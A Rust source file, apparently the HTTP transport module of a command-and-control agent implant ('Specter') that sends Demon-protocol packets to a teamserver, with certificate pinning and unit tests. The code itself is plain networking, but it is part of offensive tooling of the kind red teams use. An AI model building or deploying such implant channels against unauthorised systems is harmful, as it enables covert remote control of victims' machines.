//! HTTP transport layer for communicating with the Red Cell teamserver.

use tracing::{debug, warn};

use crate::config::SpecterConfig;
use crate::error::SpecterError;

/// HTTP transport for sending Demon protocol packets to the teamserver.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Create a new HTTP transport from the given agent configuration.
    ///
    /// If `config.pinned_cert_pem` is set, the provided PEM certificate is added as the only
    /// trusted root so the transport only accepts the pinned teamserver certificate.  When no
    /// pinned cert is configured, the system CA store is used instead.
    pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
        let mut builder = reqwest::Client::builder().user_agent(&config.user_agent);

        if let Some(pem) = &config.pinned_cert_pem {
            let cert = reqwest::Certificate::from_pem(pem.as_bytes())
                .map_err(|e| SpecterError::Transport(format!("invalid pinned certificate: {e}")))?;
            builder = builder.add_root_certificate(cert);
        }

        let client = builder.build().map_err(|e| SpecterError::Transport(e.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// Send raw packet bytes to the teamserver and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|e| SpecterError::Transport(e.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(status = %status, "teamserver returned non-success status");
            return Err(SpecterError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body = response.bytes().await.map_err(|e| SpecterError::Transport(e.to_string()))?;

        debug!(response_len = body.len(), "received response");
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;

    /// Generate a self-signed PEM certificate for testing.
    fn test_cert_pem() -> String {
        let cert = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("test cert generation");
        cert.cert.pem()
    }

    #[test]
    fn transport_creation_succeeds_with_default_config() {
        let config = SpecterConfig::default();
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn transport_creation_succeeds_with_pinned_cert() {
        let config = SpecterConfig { pinned_cert_pem: Some(test_cert_pem()), ..Default::default() };
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn transport_creation_fails_with_invalid_pem() {
        // PEM markers are present but the base64 content is malformed.
        // With the rustls backend, reqwest defers PEM parsing to build() time, so the error
        // surfaces there — we just assert that building fails with a Transport error.
        let config = SpecterConfig {
            pinned_cert_pem: Some(
                "-----BEGIN CERTIFICATE-----\n!!!NOT-VALID-BASE64!!!\n-----END CERTIFICATE-----\n"
                    .to_string(),
            ),
            ..Default::default()
        };
        let err = HttpTransport::new(&config).expect_err("invalid PEM should fail");
        assert!(matches!(err, SpecterError::Transport(_)));
    }
}
